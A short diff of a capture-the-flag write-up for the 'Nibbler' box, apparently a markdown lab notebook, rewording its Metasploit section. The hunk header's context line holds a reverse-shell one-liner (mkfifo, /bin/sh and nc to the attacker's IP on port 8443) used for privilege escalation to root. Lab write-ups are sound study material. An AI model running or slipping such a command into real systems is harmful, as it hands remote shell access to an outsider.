@@ -148,5 +148,5 @@ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [our ip] 8443 >/tmp/
 We'll upgrade that to a TTY as before, then we can run `cat root.txt` to get the next flag!
 
 ## Metasploit
-We saw earlier that there existed a `Metasploit` module that works for this box. It's considerably more straightforward but it's useful to see multiple techniques. Let's close down our reverse shells and work on this.
+We saw earlier that there existed a `Metasploit` module that works for this box. It's very straightforward and I won't bother writing it out, just see these [[metasploit]] notes. Doing this gets us a shell as `nibbler`, and we can follow the same steps to gain `root`.
 
